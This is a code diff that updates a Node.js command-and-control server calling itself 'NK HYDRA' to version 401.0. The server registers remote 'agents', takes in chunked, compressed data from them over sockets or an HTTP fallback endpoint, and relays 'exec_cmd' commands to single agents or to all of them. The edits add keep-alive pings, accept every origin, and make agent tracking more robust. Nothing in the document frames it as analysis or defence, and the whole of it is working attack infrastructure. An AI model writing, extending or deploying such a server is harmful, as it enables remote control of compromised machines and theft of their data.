@@ -1,66 +1,65 @@
 // TYPE: NODE.JS C2 SERVER
-// NK HYDRA v400.1 [TITAN LINK DE-CHUNKING + HTTP FALLBACK]
+// NK HYDRA v401.0 [ROBUST + KEEP ALIVE]
 
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const cors = require('cors');
-const zlib = require('zlib'); // Native Node module
+const zlib = require('zlib');
 
 const app = express();
-app.use(cors());
-app.use(express.json({ limit: '50mb' })); // Allow large chunks via POST
+app.use(cors({ origin: '*' })); // Allow ALL origins
+app.use(express.json({ limit: '50mb' }));
 
-app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v400.1' }); });
+app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v401.0' }); });
 
 const server = http.createServer(app);
 const io = new Server(server, { 
     cors: { origin: "*", methods: ["GET", "POST"] },
-    maxHttpBufferSize: 1e8 // 100MB
+    maxHttpBufferSize: 1e8,
+    pingTimeout: 60000,
+    pingInterval: 25000
 });
 
 let agents = []; 
 let eventHistory = []; 
-let chunkBuffer = {}; // { msgId: { total: N, chunks: { idx: data } } }
+let chunkBuffer = {};
 
 function logEvent(event) {
     eventHistory.push({ ...event, timestamp: Date.now() });
     if (eventHistory.length > 1000) eventHistory.shift();
 }
 
-// HTTP FALLBACK ENDPOINT (TITAN v4.1)
+function updateAgentStatus(agentId, meta = {}) {
+    const idx = agents.findIndex(a => a.id === agentId);
+    if (idx >= 0) {
+        agents[idx] = { ...agents[idx], ...meta, lastSeen: Date.now(), status: 'Online' };
+    } else {
+        // If unknown agent pings via HTTP, add placeholder
+        agents.push({ id: agentId, socketId: 'http_fallback', status: 'Online', lastSeen: Date.now(), ...meta });
+    }
+    io.to('ui_room').emit('agents_list', agents);
+}
+
+// HTTP FALLBACK ENDPOINT
 app.post('/fallback_event', (req, res) => {
-    // Treat the POST body exactly like a 'agent_chunk' or 'agent_event'
     const packet = req.body;
     
-    // If it's a chunk packet
-    if (packet.id && packet.data) {
-        processChunk(packet);
-    } 
-    // If it's a legacy packet (unlikely with v4 agent but good to have)
+    if (packet.id && packet.data) processChunk(packet);
     else if (packet.agentId) {
-        io.to('ui_room').emit('agent_event', packet);
-        logEvent(packet);
+        // Simple event or Heartbeat
+        if (packet.type !== 'HEARTBEAT') {
+             io.to('ui_room').emit('agent_event', packet);
+             logEvent(packet);
+        }
         updateAgentStatus(packet.agentId);
     }
-    
     res.sendStatus(200);
 });
 
-function updateAgentStatus(agentId) {
-    const agent = agents.find(a => a.id === agentId);
-    if (agent) { 
-        agent.lastSeen = Date.now(); 
-        agent.status = 'Online'; 
-        // If it was offline, broadcast update
-        io.to('ui_room').emit('agents_list', agents);
-    }
-}
-
 function processChunk(packet) {
     const { id, idx, total, data, type, agentId } = packet;
-    
-    updateAgentStatus(agentId); // Keep agent alive even via HTTP
+    updateAgentStatus(agentId);
 
     if (!chunkBuffer[id]) chunkBuffer[id] = { total, chunks: [], count: 0, type, agentId };
     
@@ -80,15 +79,10 @@ function processChunk(packet) {
                     const fullEvent = { type: chunkBuffer[id].type, agentId: chunkBuffer[id].agentId, payload };
                     io.to('ui_room').emit('agent_event', fullEvent);
                     logEvent(fullEvent);
-                } else {
-                    console.error("Decompression error", err);
                 }
                 delete chunkBuffer[id];
             });
-        } catch (e) {
-            console.error("Reassembly error", e);
-            delete chunkBuffer[id];
-        }
+        } catch (e) { delete chunkBuffer[id]; }
     }
 }
 
@@ -112,35 +106,30 @@ io.on('connection', (socket) => {
 
     socket.on('agent_chunk', (packet) => processChunk(packet));
 
-    socket.on('agent_event', (data) => {
-        io.to('ui_room').emit('agent_event', data);
-        logEvent(data); 
-        updateAgentStatus(data.agentId);
-    });
-
     socket.on('exec_cmd', (data) => {
         if (data.targetId === 'all') socket.broadcast.emit('exec_cmd', data); 
         else {
             const agent = agents.find(a => a.id === data.targetId);
-            if (agent) io.to(agent.socketId).emit('exec_cmd', data);
+            if (agent && agent.socketId !== 'http_fallback') {
+                io.to(agent.socketId).emit('exec_cmd', data);
+            }
         }
     });
 
     socket.on('disconnect', () => {
         const agent = agents.find(a => a.socketId === socket.id);
         if (agent) { 
+            // Don't mark offline immediately, wait for HTTP fallback check
             setTimeout(() => {
-                const stillHere = agents.find(a => a.id === agent.id && a.status === 'Online');
-                // Check if we received HTTP updates recently (last 5s) before marking offline
-                if (!stillHere || (Date.now() - stillHere.lastSeen > 10000)) {
-                    if (agent) agent.status = 'Offline'; 
+                const check = agents.find(a => a.id === agent.id);
+                if (check && (Date.now() - check.lastSeen > 15000)) {
+                    check.status = 'Offline'; 
                     io.to('ui_room').emit('agents_list', agents);
                 }
-            }, 5000); 
+            }, 15000); 
         }
     });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v400.1 LISTENING ON ${PORT}`));
-
+server.listen(PORT, () => console.log(`HYDRA v401.0 RUNNING ON ${PORT}`));
